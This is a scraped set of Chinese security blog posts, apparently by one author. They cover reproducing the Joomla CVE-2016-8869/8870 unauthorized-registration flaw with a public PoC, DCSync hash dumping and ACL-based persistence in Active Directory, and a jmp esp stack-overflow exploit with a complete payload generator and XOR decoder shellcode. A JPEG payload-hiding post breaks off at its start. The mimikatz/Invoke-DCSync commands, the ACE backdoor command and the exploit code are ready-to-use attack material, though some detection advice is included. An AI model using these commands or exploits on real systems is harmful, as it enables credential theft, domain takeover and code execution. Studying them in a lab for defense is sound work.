<h2 id="0x01-cve-2016-8870">0x01 CVE-2016-8870</h2>
<hr>

<h3 id="漏洞影响">漏洞影响</h3>

<p>网站关闭注册的情况下仍可创建用户</p>

<h3 id="影响版本">影响版本</h3>

<p>3.4.4 to 3.6.3</p>

<h3 id="漏洞原理">漏洞原理</h3>

<p>存在两个用于用户注册的方法：</p>

<p>位于components/com_users/controllers/registration.php中的UsersControllerRegistration::register()</p>

<p>位于components/com_users/controllers/user.php中的UsersControllerUser::register()</p>

<p>相对于UsersControllerRegistration::register()，UsersControllerUser::register()的实现中并没有这几行代码：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>// If registration is disabled - Redirect to login page.
if (JComponentHelper::getParams('com_users')-&gt;get('allowUserRegistration') == 0)  
{
    $this-&gt;setRedirect(JRoute::_('index.php?option=com_users&amp;view=login', false));

    return false;
}
</code></pre></div></div>

<p>这几行代码是检查是否允许注册，也就是说如果我们可以用UsersControllerUser::register()这个方法来进行注册就可以绕过这个检测</p>

<h3 id="补丁分析">补丁分析</h3>

<p>官方删除了UsersControllerUser::register()方法</p>

<p><strong>注：</strong></p>

<p>以上引用自http://paper.seebug.org/86/</p>

<h2 id="0x02-cve-2016-8869">0x02 CVE-2016-8869</h2>
<hr>

<h3 id="漏洞影响-1">漏洞影响</h3>

<p>网站关闭注册的情况下仍可创建特权用户</p>

<h3 id="影响版本-1">影响版本</h3>

<p>3.4.4 to 3.6.3</p>

<h3 id="漏洞原理-1">漏洞原理</h3>

<p>构造特殊的请求包实现对用来表示权限的groups进行赋值</p>

<h3 id="补丁分析-1">补丁分析</h3>

<p>官方删除了UsersControllerUser::register()方法</p>

<p><strong>注：</strong></p>

<p>以上引用自http://paper.seebug.org/88/</p>

<h2 id="0x03-实际测试">0x03 实际测试</h2>
<hr>
<p><strong>测试系统：</strong></p>

<p>Win8.1 x86</p>

<h3 id="1搭建php环境">1、搭建php环境</h3>

<p>下载安装phpStudy</p>

<p>安装后如图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2016-10-31/2-1.png" alt="Alt text"></p>

<p>配置目录为：C:\WWW</p>

<h3 id="2配置joomla环境">2、配置Joomla环境</h3>

<p>下载3.6.3版本的Joomla，地址如下：</p>

<p>https://github.com/joomla/joomla-cms/releases/download/3.6.3/Joomla_3.6.3-Stable-Full_Package.tar.gz</p>

<p>解压后将文件放于C:\WWW下</p>

<p>访问http://localhost进入安装页面</p>

<p>如图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2016-10-31/2-2.png" alt="Alt text"></p>

<p>数据库类型选择MySQL，如图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2016-10-31/2-3.png" alt="Alt text"></p>

<p>登陆数据库，默认密码为root</p>

<p>如图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2016-10-31/2-4.png" alt="Alt text"></p>

<p>等待安装完成</p>

<h3 id="3网页登陆测试">3、网页登陆，测试</h3>

<p>环境配置成功，如图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2016-10-31/3-1.png" alt="Alt text"></p>

<h3 id="4poc测试">4、poc测试</h3>

<p><strong>poc地址：</strong></p>

<p>https://github.com/XiphosResearch/exploits/tree/master/Joomraa</p>

<p><strong>参数如下：</strong></p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>joomraa.py  -u hacker -p password -e hacker@example.com http://192.168.1.111
</code></pre></div></div>

<p>如下图，提示需要登陆邮箱查看激活邮件，所以邮箱参数需要填写真实的邮箱地址</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2016-10-31/3-2.png" alt="Alt text"></p>

<p>此时查看Joomla后台，发现用户添加成功，但是状态为未激活，如图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2016-10-31/3-3.png" alt="Alt text"></p>

<h3 id="5设置joomla开启发送激活邮件的功能">5、设置Joomla，开启发送激活邮件的功能</h3>

<p>选择Global Configuration-Global-Server</p>

<p>如图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2016-10-31/3-4.png" alt="Alt text"></p>

<p>设置邮箱参数</p>

<p><strong>注：</strong>
邮箱账户需要开启SMTP功能</p>

<p>选择<code class="language-plaintext highlighter-rouge">Send Test Mail</code>验证邮箱，如图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2016-10-31/5-1.png" alt="Alt text"></p>

<p>如图，验证邮件接收成功</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2016-10-31/3-5.png" alt="Alt text"></p>

<h3 id="6再次测试poc">6、再次测试POC</h3>

<p>成功收到激活邮件，如图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2016-10-31/3-6.png" alt="Alt text"></p>

<p>点开链接后报错，如图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2016-10-31/3-7.png" alt="Alt text"></p>

<p>查看Joomla源码，位置如下：</p>

<p>https://github.com/joomla/joomla-cms/blob/staging/components/com_users/controllers/registration.php</p>

<p>找到问题原因： <code class="language-plaintext highlighter-rouge">If user registration or account activation is disabled, throw a 403.</code></p>

<p>如下图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2016-10-31/5-2.png" alt="Alt text"></p>

<h3 id="7开启用户注册功能">7、开启用户注册功能</h3>

<p>选择Global Configuration-Users-User Options，点击允许用户注册，如图
<img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2016-10-31/4-1.png" alt="Alt text"></p>

<p><strong>注：</strong></p>

<p>自Joomla3.4以后，用户注册功能默认关闭</p>

<h3 id="8最后测试">8、最后测试</h3>

<p>开启用户注册功能后，再次点击激活邮件，成功激活账户</p>

<p>如图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2016-10-31/4-2.png" alt="Alt text"></p>

<p>后台显示用户激活，如图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2016-10-31/4-3.png" alt="Alt text"></p>

<h3 id="9得出最终结论">9、得出最终结论</h3>

<p>利用该漏洞可在网站后台关闭用户注册的情况下创建特权用户，但是状态为未激活</p>

<p>只有网站后台开启发送邮件的功能后，攻击者邮箱才能收到激活邮件</p>

<p>只有网站后台开启用户注册功能，激活码才能生效，使得用户被激活</p>

<p>未激活的用户无法用于登录</p>

<p>高于3.4版本的Joomla，用户注册功能默认关闭</p>

<p>Joomla升级到3.6.4后，测试poc显示攻击成功，然而网站后台并没有添加用户，也不会发送激活邮件，防御成功</p>

<p>综上，<code class="language-plaintext highlighter-rouge">攻击者想要获得网站后台管理员权限，需要同时满足以下条件：</code></p>

<ul>
  <li>Joomla版本为3.4.4-3.6.3</li>
  <li>网站后台开启发送邮件功能</li>
  <li>网站后台开启用户注册功能</li>
</ul>

<h2 id="0x04-备注">0x04 备注</h2>
<hr>
<p>感谢DM的帮助</p>

<p>本文仅为测试记录</p>

<p>根据POC开发了一个检查网站是否开放注册功能的python脚本，地址如下：</p>

<p>https://github.com/3gstudent/Test-Exploit-for-Joomla-3.4.4-3.6.4</p>

<p>可用来简单判断网站是否支持用户注册</p>

<p><strong>在此提醒网站管理员，尽快升级Joomla，如果Joomla版本过低，并且开启发送邮件和用户注册功能，那么很容易遭到攻击。</strong></p>

<hr>

<p><a href="https://github.com/3gstudent/feedback/issues/new">LEAVE A REPLY</a></p>

  </div>

  <div class="date">
    Written on October 31, 2016
  </div>

  
</article><article class="post">
  <h1>域渗透——DCSync</h1>

  <div class="entry">
    <h2 id="0x00-前言">0x00 前言</h2>
<hr>

<p>DCSync是域渗透中经常会用到的技术，本文会对开源的资料进行整理，结合自己的经验，总结利用和防御检测的方法</p>

<h2 id="0x01-简介">0x01 简介</h2>
<hr>

<p>本文将要介绍以下内容：</p>

<ul>
  <li>利用DCSync导出域内所有用户hash的方法</li>
  <li>利用DCSync在域内维持权限的方法</li>
  <li>自动化检测DCSync后门的方法</li>
</ul>

<h2 id="0x02-利用dcsync导出域内所有用户hash的方法">0x02 利用DCSync导出域内所有用户hash的方法</h2>
<hr>

<p>DCSync是mimikatz在2015年添加的一个功能，由Benjamin DELPY gentilkiwi和Vincent LE TOUX共同编写，能够用来导出域内所有用户的hash</p>

<p><strong>利用条件：</strong></p>

<p>获得以下任一用户的权限：</p>

<ul>
  <li>Administrators组内的用户</li>
  <li>Domain Admins组内的用户</li>
  <li>Enterprise Admins组内的用户</li>
  <li>域控制器的计算机帐户</li>
</ul>

<p><strong>利用原理：</strong></p>

<p>利用DRS(Directory Replication Service)协议通过IDL_DRSGetNCChanges从域控制器复制用户凭据</p>

<p>参考资料：
https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-drsr/f977faaa-673e-4f66-b9bf-48c640241d47</p>

<p><strong>实现代码：</strong></p>

<p>https://github.com/gentilkiwi/mimikatz/blob/master/mimikatz/modules/lsadump/kuhl_m_lsadump_dc.c#L27</p>

<p><strong>利用方法：</strong></p>

<h4 id="1使用mimikatz">1.使用mimikatz</h4>

<p>导出域内所有用户的hash：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>mimikatz.exe privilege::debug "lsadump::dcsync /domain:test.com /all /csv" exit
</code></pre></div></div>

<p>导出域内administrator帐户的hash：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>mimikatz.exe privilege::debug "lsadump::dcsync /domain:test.com /user:administrator /csv" exit
</code></pre></div></div>

<h4 id="2powershell实现">2.powershell实现</h4>

<p>https://gist.github.com/monoxgas/9d238accd969550136db</p>

<p>通过Invoke-ReflectivePEinjection调用mimikatz.dll中的dcsync功能</p>

<p>导出域内所有用户的hash：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Invoke-DCSync -DumpForest | ft -wrap -autosize
</code></pre></div></div>

<p>导出域内administrator帐户的hash：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Invoke-DCSync -DumpForest -Users @("administrator") | ft -wrap -autosize
</code></pre></div></div>

<p><strong>注：</strong></p>

<p>获得了域内用户的hash后，进一步利用可参考之前的文章：</p>

<p><a href="https://3gstudent.github.io/3gstudent.github.io/%E5%9F%9F%E6%B8%97%E9%80%8F-Pass-The-Hash%E7%9A%84%E5%AE%9E%E7%8E%B0/">《域渗透——Pass The Hash的实现》</a></p>

<p><a href="https://3gstudent.github.io/3gstudent.github.io/%E6%B8%97%E9%80%8F%E6%8A%80%E5%B7%A7-Pass-the-Hash-with-Remote-Desktop/">《渗透技巧——Pass the Hash with Remote Desktop》</a></p>

<p>《域渗透——Pass The Hash &amp; Pass The Key》</p>

<h2 id="0x03-利用dcsync在域内维持权限的方法">0x03 利用DCSync在域内维持权限的方法</h2>
<hr>

<p><strong>利用条件：</strong></p>

<p>获得以下任一用户的权限：</p>

<ul>
  <li>Domain Admins组内的用户</li>
  <li>Enterprise Admins组内的用户</li>
</ul>

<p><strong>利用原理：</strong></p>

<p>向域内的一个普通用户添加如下三条ACE(Access Control Entries)：</p>

<ul>
  <li>DS-Replication-Get-Changes(GUID:1131f6aa-9c07-11d1-f79f-00c04fc2dcd2)</li>
  <li>DS-Replication-Get-Changes-All(GUID:1131f6ad-9c07-11d1-f79f-00c04fc2dcd2)</li>
  <li>DS-Replication-Get-Changes(GUID:89e95b76-444d-4c62-991a-0facbeda640c)</li>
</ul>

<p>该用户即可获得利用DCSync导出域内所有用户hash的权限</p>

<p><strong>实现代码：</strong></p>

<p>https://github.com/PowerShellMafia/PowerSploit/blob/dev/Recon/PowerView.ps1#L8270</p>

<p><strong>利用方法：</strong></p>

<p>添加ACE的命令如下：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Add-DomainObjectAcl -TargetIdentity "DC=test,DC=com" -PrincipalIdentity test1 -Rights DCSync -Verbose
</code></pre></div></div>

<p><strong>补充：</strong></p>

<p>删除ACE的命令：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Remove-DomainObjectAcl -TargetIdentity "DC=test,DC=com" -PrincipalIdentity test1 -Rights DCSync -Verbose
</code></pre></div></div>

<p><strong>注：</strong></p>

<p>关于更多ACL的内容可参考之前的文章：<a href="https://3gstudent.github.io/3gstudent.github.io/%E6%B8%97%E9%80%8F%E6%8A%80%E5%B7%A7-Windows%E4%B8%8B%E7%9A%84Access-Control-List/">《渗透技巧——Windows下的Access Control List》</a></p>

<p>使用域用户test1调用DCSync的方法如下：</p>

<h4 id="1在域内一台登录了test1用户的主机上面直接使用mimikatz的dcsync功能">1.在域内一台登录了test1用户的主机上面，直接使用mimikatz的DCSync功能</h4>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>mimikatz.exe privilege::debug "lsadump::dcsync /domain:test.com /all /csv" exit
</code></pre></div></div>

<h4 id="2使用runas实现登录test1用户再使用dcsync">2.使用runas实现登录test1用户，再使用DCSync</h4>

<p>(1)弹出cmd</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>runas /noprofile /user:test\test1 cmd
</code></pre></div></div>

<p>弹出的cmd下执行如下命令：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>mimikatz.exe privilege::debug "lsadump::dcsync /domain:test.com /all /csv" exit
</code></pre></div></div>

<p>(2)不弹框实现</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>runas /noprofile /user:test\test1 c:\test\1.bat
</code></pre></div></div>

<p>1.bat的内容如下:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>c:\test\mimikatz.exe privilege::debug "lsadump::dcsync /domain:test.com /user:administrator /csv" exit&gt;c:\test\1.txt
</code></pre></div></div>

<p><strong>注：</strong></p>

<p>同类的工具还有lsrunas、lsrunase和CPAU</p>

<h4 id="3使用powershell实现登录test1用户再使用dcsync">3.使用powershell实现登录test1用户，再使用DCSync</h4>

<p>(1)弹出cmd</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$uname="test\test1"                                                      
$pwd=ConvertTo-SecureString "12345678" -AsPlainText –Force                   
$cred=New-Object System.Management.Automation.PSCredential($uname,$pwd)        
Start-Process -FilePath "cmd.exe" -Credential $cred  
</code></pre></div></div>

<p>弹出的cmd下执行如下命令：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>mimikatz.exe privilege::debug "lsadump::dcsync /domain:test.com /user:administrator /csv" exit
</code></pre></div></div>

<p>(2)不弹框实现</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$uname="test\test1"                                                      
$pwd=ConvertTo-SecureString "12345678" -AsPlainText –Force                   
$cred=New-Object System.Management.Automation.PSCredential($uname,$pwd)        
Start-Process -FilePath "c:\test\1.bat" -Credential $cred
</code></pre></div></div>

<p>1.bat的内容如下:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>c:\test\mimikatz.exe privilege::debug "lsadump::dcsync /domain:test.com /user:administrator /csv" exit&gt;c:\test\1.txt
</code></pre></div></div>

<p><strong>注：</strong></p>

<p>使用wmic在本机实现登录用户test1会失败，错误如下：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ERROR:
Description = User credentials cannot be used for local connections
</code></pre></div></div>

<h2 id="0x04-自动化检测dcsync后门的方法">0x04 自动化检测DCSync后门的方法</h2>
<hr>

<p>具有高权限但不在高权限组的用户被称之为Shadow Admin，例如0x03中的域用户test1，仅通过查询高权限组的成员无法发现域内的Shadow Admin</p>

<p><strong>检测原理：</strong></p>

<p>枚举Active Directory中所有用户的ACL，标记出特权帐户</p>

<p><strong>实现代码：</strong></p>

<p>https://github.com/cyberark/ACLight</p>

<p><strong>利用条件：</strong></p>

<ul>
  <li>Powershell v3.0</li>
  <li>域内普通用户权限</li>
</ul>

<p><strong>检测方法：</strong></p>

<p>执行项目中的Execute-ACLight2.bat</p>

<p>生成三个文件：</p>

<ul>
  <li>Privileged Accounts - Layers Analysis.txt</li>
  <li>Privileged Accounts Permissions - Final Report.csv</li>
  <li>Privileged Accounts Permissions - Irregular Accounts.csv</li>
</ul>

<p>文件中会显示出所有特权帐户</p>

<p>经测试，ACLight能够检测出被添加DCSync权限的用户test1</p>

<h2 id="0x05-小结">0x05 小结</h2>
<hr>

<p>本文介绍了域渗透中DCSync的利用和自动化检测的方法，站在防御的角度，建议使用ACLight对域环境的用户ACL进行检测</p>

<hr>

<p><a href="https://github.com/3gstudent/feedback/issues/new">LEAVE A REPLY</a></p>


  </div>

  <div class="date">
    Written on July 11, 2019
  </div>

  
</article><article class="post">
  <h1>Windows Shellcode学习笔记——栈溢出中对jmp esp的利用与优化</h1>

  <div class="entry">
    <h2 id="0x00-前言">0x00 前言</h2>
<hr>

<p>在<a href="https://3gstudent.github.io/3gstudent.github.io/Windows-Shellcode%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-shellcode%E5%9C%A8%E6%A0%88%E6%BA%A2%E5%87%BA%E4%B8%AD%E7%9A%84%E5%88%A9%E7%94%A8%E4%B8%8E%E4%BC%98%E5%8C%96/">《Windows Shellcode学习笔记——shellcode在栈溢出中的利用与优化》</a>中对栈溢出的利用做了介绍。通过将返回地址覆盖为shellcode在内存中的起始地址，实现对栈溢出的利用</p>

<p>但是shellcode在内存中的起始地址往往不固定，导致漏洞利用不一定成功，本文将通过jmp esp的方式来解决这个问题</p>

<h2 id="0x01-简介">0x01 简介</h2>
<hr>

<p>函数代码在栈中保存顺序(直观理解，已省略其他细节)：</p>

<ul>
  <li>buffer</li>
  <li>前栈帧EBP</li>
  <li>返回地址</li>
  <li>ESP</li>
</ul>

<p>ESP寄存器总是指向返回地址的下一地址</p>

<p>如果用jmp esp覆盖返回地址，那么在函数返回后会执行jmp esp，跳到esp，也就是返回地址的下一地址开始执行</p>

<p>因此，将shellcode放于返回地址之后，并将返回地址覆盖为jmp esp，就可以避免shellcode在内存中产生的移位问题</p>

<p>本文将要介绍使用jmp esp的具体细节，并分享如何优化我们自己生成的弹框实例shellcode，实现jmp esp利用，编写程序自动实现，解决shellcode在内存中的起始地址不固定的问题。</p>

<p><strong>弹框实例shellcode下载地址：</strong></p>

<p>https://github.com/3gstudent/Shellcode-Generater/blob/master/shellcode.bin</p>

<h2 id="0x01-jmp-esp">0x01 jmp esp</h2>
<hr>

<p><strong>获得jmp esp的机器码：</strong></p>

<p>可通过搜索各个进程空间来获取，具体原理可参考《0day安全：软件漏洞分析技术》3.2.2节</p>

<p>为便于理解和测试，直接引用《0day安全：软件漏洞分析技术》3.2.2节中的代码，代码如下：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>#include &lt;stdio.h&gt;
#include &lt;windows.h&gt;
#define DLL_NAME "user32.dll"
int main()
{
	BYTE *ptr;
	int position,address;
	HINSTANCE handle;
	BOOL done_flag=FALSE;
	handle=LoadLibrary(DLL_NAME);
	if(!handle)
	{
		printf("load dll error");
		return 0;
	}
	ptr=(BYTE *)handle;
	for(position=0;!done_flag;position++)
	{
		try
		{
			if(ptr[position]==0xFF &amp;&amp;ptr[position+1]==0xE4)
			{
				int address=(int)ptr+position;
				printf("OPCODE found at 0x%x\n",address);
			}
		}
		catch(...)
		{
		int address=(int)ptr+position;
		printf("END OF 0x%x\n",address);
		done_flag=true;
		}
	}
	return 0;
}
</code></pre></div></div>

<p>如下图，获得机器码，挑选第一个地址0x77d29353，构建我们的shellcode</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2017-3-2/2-1.png" alt="Alt text"></p>

<p>初步设想shellcode的结构为：</p>

<p><code class="language-plaintext highlighter-rouge">填充数据(长度44)+偏移长度+jmp esp的机器码+解码器+加密的弹框shellcode+结束字符</code></p>

<p>具体数据为：</p>

<p><code class="language-plaintext highlighter-rouge">"\x34\x33\x32\x31“*11+"\x90\x90\x90\x90\x90\x90\x90\x90"+"\x53\x93\xD2\x77"+"\x83\xC2\x14\x33\xC9\x8A\x1C\x0A\x80\xF3\x44\x88\x1C\x0A\x41\x80\xFB\x91\x75\xF1"+加密的弹框shellcode+\xD5</code></p>

<p>通过程序自动实现此过程，代码如下：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>#include &lt;windows.h&gt;
size_t GetSize(char * szFilePath)
{
	size_t size;
	FILE* f = fopen(szFilePath, "rb");
	fseek(f, 0, SEEK_END);
	size = ftell(f);
	rewind(f);
	fclose(f);
	return size;
}
unsigned char* ReadBinaryFile(char *szFilePath, size_t *size)
{
	unsigned char *p = NULL;
	FILE* f = NULL;
	size_t res = 0;
	*size = GetSize(szFilePath);
	if (*size == 0) return NULL;		
	f = fopen(szFilePath, "rb");
	if (f == NULL)
	{
		printf("Binary file does not exists!\n");
		return 0;
	}
	p = new unsigned char[*size];
	rewind(f);
	res = fread(p, sizeof(unsigned char), *size, f);
	fclose(f);
	if (res == 0)
	{
		delete[] p;
		return NULL;
	}
	return p;
}
int main(int argc, char* argv[])
{
	char *szFilePath="c:\\test\\shellcode.bin";
	char *szFilePath2="c:\\test\\shellcode2.bin";
	unsigned char *BinData = NULL;
	size_t size = 0;	
	BinData = ReadBinaryFile(szFilePath, &amp;size);
	for(int i=0;i&lt;size;i++)
	{
		BinData[i]=BinData[i]^0x44;
	}
	FILE* f = NULL;	
	f = fopen(szFilePath2, "wb");
	if (f == NULL)
	{
		printf("Create error\n");
		return 0;
	}
	char filler[]="\x34\x33\x32\x31\x34\x33\x32\x31\x34\x33\x32\x31\x34\x33\x32\x31\x34\x33\x32\x31\x34\x33\x32\x31\x34\x33\x32\x31\x34\x33\x32\x31\x34\x33\x32\x31\x34\x33\x32\x31\x34\x33\x32\x31";
	char nop[]="\x90\x90\x90\x90\x90\x90\x90\x90";
	char jmpesp[]="\x53\x93\xD2\x77";
	char decode[]="\x83\xC2\x14\x33\xC9\x8A\x1C\x0A\x80\xF3\x44\x88\x1C\x0A\x41\x80\xFB\x91\x75\xF1";
	char end[]="\xD5";
	fwrite(filler,sizeof(filler)-1,1,f);
	fwrite(nop,sizeof(nop)-1,1,f);
	fwrite(jmpesp,sizeof(jmpesp)-1,1,f);
	fwrite(decode,sizeof(decode)-1,1,f);
	fwrite(BinData,size,1,f);
	fwrite(end,1,1,f);
	fclose(f);
}
</code></pre></div></div>

<p>运行后生成shellcode2.bin</p>

<p>由于我们自己生成的这个shellcode长度较长，在测试时需要对原书中的栈溢出程序作修改，否则会报错，例如
<code class="language-plaintext highlighter-rouge">if(!(fp=fopen("password.txt","rw+")))</code>
应修改为
<code class="language-plaintext highlighter-rouge">if(!(fp=fopen("password2.txt","rb")))</code></p>

<p>更多细节可参考完整代码，栈溢出测试程序的完整代码已上传至github，地址如下：</p>

<p>https://github.com/3gstudent/Shellcode-Generater/blob/master/stackoverflowExample(jmpesp).cpp</p>

<p>测试栈溢出测试程序</p>

<p>测试环境：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>测试系统：Win XP
编译器：VC6.0
build版本： debug版本
</code></pre></div></div>

<p>测试栈溢出测试程序，发现报错</p>

<h2 id="0x02-shellcode调试与优化">0x02 shellcode调试与优化</h2>
<hr>

<p>使用OllyDbg调试</p>

<p>关键位置按F2下断点，按F9执行到断点处</p>

<p>如下图，成功覆盖返回地址，数值为0x77d29353</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2017-3-2/2-2.png" alt="Alt text"></p>

<p>按F8单步执行，跳到JMP ESP，如下图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2017-3-2/2-3.png" alt="Alt text"></p>

<p>接着F8单步执行，如下图，此时EDX寄存器不再保存shellcode起始地址，EDX值为<code class="language-plaintext highlighter-rouge">0x0012FFE0</code>，而理论上shellcode起始地址应为<code class="language-plaintext highlighter-rouge">0x0012F77C</code></p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2017-3-2/2-4.png" alt="Alt text"></p>

<p>需要找到一个能保存shellcode起始地址的寄存器或者存在某种偏移关系的寄存器</p>

<p>通过进一步调试，发现整个过程EDI寄存器的值保持不变，为 <code class="language-plaintext highlighter-rouge">0X0012F720</code>，而且shellcode起始地址作了变化，不再是<code class="language-plaintext highlighter-rouge">0x0012F77C</code></p>

<p>如下图，在CALL test2.004011A0下断点，shellcode起始地址由0x0012F77C变为0X0012F6F0</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2017-3-2/2-5.png" alt="Alt text"></p>

<p>如下图，0x0012F77C已被覆盖，侧面证明shellcode起始地址发生变化</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2017-3-2/2-6.png" alt="Alt text"></p>

<p>综上，可大胆推测实际shellcode起始地址=EDI-0X000008F0h</p>

<p>解码器实现思路如下：</p>

<p>通过<code class="language-plaintext highlighter-rouge">EDI-0X000008F0h</code>来获得shellcode起始地址，并且保存在寄存器EAX中</p>

<p>对应汇编代码如下：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>void main()
{
	__asm
	{
		sub edi,0x8F0
		mov eax,edi
		add eax,0x28
		xor ecx,ecx
decode_loop:
		mov bl,[eax+ecx]
		xor bl,0x44
		mov [eax+ecx],bl
		inc ecx
		cmp bl,0x91
		jne decode_loop
	}
}
</code></pre></div></div>

<p>提取出机器码为
<code class="language-plaintext highlighter-rouge">"\x81\xEF\xF0\x08\x00\x00\x8B\xC7\x83\xC0\x28\x33\xC9\x8A\x1C\x08\x80\xF3\x44\x88\x1C\x08\x41\x80\xFB\x91\x75\xF1"</code></p>

<p>如图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2017-3-2/2-7.png" alt="Alt text"></p>

<p>此时又出现\x00字符，实际使用时会被提前截断，所以汇编代码需要作进一步优化：</p>

<p>通过先加后减两步操作，来避免shellcode出现\00字符</p>

<p><strong>注：</strong></p>

<p>先减后加会造成越界</p>

<p>先加后减两步操作如下：</p>

<p><code class="language-plaintext highlighter-rouge">EDI-0X000008F0h=0X0012F720+0X11111111h-0X111119A1h</code></p>

<p>由于shellcode前面多了填充数据，所以解码器的偏移也要重新计算，偏移=填充数据长度+解码器长度=0x34+0x26=0x5A</p>

<p>对应完整汇编代码如下：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>void main()
{
	__asm
	{
		add edi,0X11111111
		sub edi,0X111119A1
		mov eax,edi
		add eax,0x5A
		xor ecx,ecx
decode_loop:
		mov bl,[eax+ecx]
		xor bl,0x44
		mov [eax+ecx],bl
		inc ecx
		cmp bl,0x91
		jne decode_loop
	}
}
</code></pre></div></div>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2017-3-2/2-8.png" alt="Alt text"></p>

<p>如上图，提取机器码为</p>

<p><code class="language-plaintext highlighter-rouge">"\x81\xC7\x11\x11\x11\x11\x81\xEF\xA1\x19\x11\x11\x8B\xC7\x83\xC0\x5A\x33\xC9\x8A\x1C\x08\x80\xF3\x44\x88\x1C\x08\x41\x80\xFB\x91\x75\xF1"</code></p>

<p>如下图，寻址正常，shellcode成功执行</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2017-3-2/2-9.png" alt="Alt text"></p>

<h2 id="0x03-程序自动实现">0x03 程序自动实现</h2>

<p>将以上代码同获得jmp esp机器码的代码融合，实现自动获取jmp esp的机器码并写入shellcode，完整代码已上传至github：</p>

<p>https://github.com/3gstudent/Shellcode-Generater/blob/master/jmpespshellcode.cpp</p>

<p><strong>注：</strong></p>

<p>通过子函数GetAddress()实现自动寻址，需要先从子函数GetAddress()返回int型数据，再在main函数中通过指针读取jmp esp的机器码</p>

<p>如果顺序颠倒，那么地址无法获取</p>

<p>错误的获取地址代码如下：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>unsigned char *GetAddress()
{
	BYTE *ptr;
	int position,address;
	HINSTANCE handle;
	BOOL done_flag=FALSE;
	handle=LoadLibrary(DLL_NAME);
	if(!handle)
	{
		printf("load dll error");
		return 0;
	}
	ptr=(BYTE *)handle;
	for(position=0;!done_flag;position++)
	{
		try
		{
			if(ptr[position]==0xFF &amp;&amp;ptr[position+1]==0xE4)
			{
				int address=(int)ptr+position;
				unsigned char *Buff=(unsigned char *)&amp;address;
				return Buff;				
			}			
		}
		catch(...)
		{
		int address=(int)ptr+position;
		printf("END OF 0x%x\n",address);
		done_flag=true;
		}
	}
	return 0;
}
unsigned char *jmpesp=NULL;
jmpesp=GetAddress();
</code></pre></div></div>

<h2 id="0x04-小结">0x04 小结</h2>
<hr>

<p>本文介绍了栈溢出中使用jmp esp的利用方法，结合遇到的实际情况对我们自己生成的弹框实例shellcode作优化，选取固定寄存器地址，计算偏移，最终定位shellcode起始地址，完成利用。</p>

<hr>

<p><a href="https://github.com/3gstudent/feedback/issues/new">LEAVE A REPLY</a></p>


  </div>

  <div class="date">
    Written on March  2, 2017
  </div>

  
</article><article class="post">
  <h1>隐写技巧——利用JPEG文件格式隐藏payload</h1>

  <div class="entry">
    <h2 id="0x00-前言">0x00 前言</h2>
<hr>

<p>继续对图片隐写技巧的学习，这次是对JPEG文件格式的学习和理解。同PNG文件的格式对比，JPEG文件相对简单，读取其中隐藏payload的方式大同小异，两者区别在于文件格式不同，可供利用的细节存在差异。</p>

<h3 id="本文相关工具">本文相关工具：</h3>

<ul>
  <li>
